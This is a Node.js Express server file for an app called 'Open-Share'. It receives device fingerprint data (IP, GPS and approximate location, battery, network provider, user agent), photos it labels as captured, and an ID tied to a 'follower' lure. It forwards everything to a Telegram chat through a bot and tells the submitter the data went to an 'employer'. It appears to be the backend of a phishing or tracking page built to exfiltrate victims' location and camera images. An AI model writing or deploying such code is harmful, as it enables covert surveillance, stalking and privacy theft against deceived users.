require('dotenv').config();
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const cors = require('cors');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// Ensure uploads directory exists
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Multer config for image uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1e9);
    cb(null, file.fieldname + '-' + uniqueSuffix + '.jpg');
  }
});

const upload = multer({ 
  storage: storage,
  limits: { fileSize: 10 * 1024 * 1024 } // 10MB limit
});

// Telegram config
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

// ========================
// Helper: Send message to Telegram
// ========================
async function sendTelegramMessage(text) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    await axios.post(url, {
      chat_id: TELEGRAM_CHAT_ID,
      text: text,
      parse_mode: 'HTML'
    });
  } catch (error) {
    console.error('Telegram message error:', error.message);
  }
}

// ========================
// Helper: Send photo to Telegram
// ========================
async function sendTelegramPhoto(photoPath, caption) {
  try {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
    const FormData = require('form-data');
    const form = new FormData();

    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('photo', fs.createReadStream(photoPath));
    form.append('caption', caption);

    await axios.post(url, form, {
      headers: form.getHeaders()
    });
  } catch (error) {
    console.error('Telegram photo error:', error.message);
  }
}

// ========================
// API: Get dates from date.json
// ========================
app.get('/api/dates', (req, res) => {
  try {
    const dates = [
      "100 Followers",
      "200 Followers",
      "300 Followers",
      "500 Followers",
      "1k Followers",
      "2k Followers",
      "3k Followers",
      "5k Followers"
    ];
    res.json({ success: true, dates });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========================
// API: Submit fingerprint data
// ========================
app.post('/api/submit', upload.array('photos', 10), async (req, res) => {
  try {
    const { rorshid, interviewDate, deviceData } = req.body;
    const photos = req.files || [];

    // Parse device data
    let parsedDeviceData = {};
    try {
      parsedDeviceData = JSON.parse(deviceData || '{}');
    } catch (e) {
      parsedDeviceData = {};
    }

    // Build the message
    const timestamp = new Date().toISOString();

    let message = `
<b>🔔 NEW OPEN-SHARE SUBMISSION</b>
━━━━━━━━━━━━━━━━━━━━━━

<b>👤 RORSHID:</b> <code>${rorshid || 'N/A'}</code>
<b>📅 Interview Date:</b> ${interviewDate || 'N/A'}
<b>⏰ Submitted At:</b> ${timestamp}

<b>📊 DEVICE FINGERPRINT DATA</b>
━━━━━━━━━━━━━━━━━━━━━━
<b>🌐 IP Address (IPv6):</b> ${parsedDeviceData.ipv6 || 'N/A'}
<b>📍 Approx Location:</b> ${parsedDeviceData.approxLocation || 'N/A'}
<b>🌍 GPS Location:</b> ${parsedDeviceData.gpsLocation || 'N/A'}
<b>🖥️ Browser:</b> ${parsedDeviceData.browser || 'N/A'}
<b>💻 OS:</b> ${parsedDeviceData.os || 'N/A'}
<b>📱 Device Type:</b> ${parsedDeviceData.deviceType || 'N/A'}
<b>🗣️ Language:</b> ${parsedDeviceData.language || 'N/A'}
<b>📐 Screen Resolution:</b> ${parsedDeviceData.screenResolution || 'N/A'}
<b>🌐 Network Provider:</b> ${parsedDeviceData.networkProvider || 'N/A'}
<b>🔋 Battery:</b> ${parsedDeviceData.battery || 'N/A'}
<b>🔗 Connection Type:</b> ${parsedDeviceData.connectionType || 'N/A'}
<b>⚡ Effective Type:</b> ${parsedDeviceData.effectiveType || 'N/A'}
<b>📶 Downlink:</b> ${parsedDeviceData.downlink || 'N/A'}
<b>🎨 Color Depth:</b> ${parsedDeviceData.colorDepth || 'N/A'}
<b>🖱️ Touch Support:</b> ${parsedDeviceData.touchSupport || 'N/A'}
<b>🧭 Orientation:</b> ${parsedDeviceData.orientation || 'N/A'}
<b>🔌 Platform:</b> ${parsedDeviceData.platform || 'N/A'}
<b>👁️ User Agent:</b> <code>${parsedDeviceData.userAgent ? parsedDeviceData.userAgent.substring(0, 200) : 'N/A'}</code>

<b>📸 PHOTOS CAPTURED:</b> ${photos.length}
    `;

    // Send text message first
    await sendTelegramMessage(message);

    // Send each photo
    for (let i = 0; i < photos.length; i++) {
      await sendTelegramPhoto(
        photos[i].path,
        `📸 Photo ${i + 1}/${photos.length} — ${rorshid || 'Unknown'}`
      );
    }

    // Cleanup uploaded files
    photos.forEach(photo => {
      try {
        fs.unlinkSync(photo.path);
      } catch (e) {
        console.error('Cleanup error:', e.message);
      }
    });

    res.json({ success: true, message: 'Data forwarded to employer successfully' });

  } catch (error) {
    console.error('Submit error:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// ========================
// Serve index.html for all other routes
// ========================
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`\n🚀 Open-Share Server running on http://localhost:${PORT}`);
  console.log(`📡 Telegram Bot: ${TELEGRAM_BOT_TOKEN ? 'Configured ✓' : 'NOT CONFIGURED ✗'}`);
  console.log(`💬 Chat ID: ${TELEGRAM_CHAT_ID || 'NOT SET'}\n`);
});
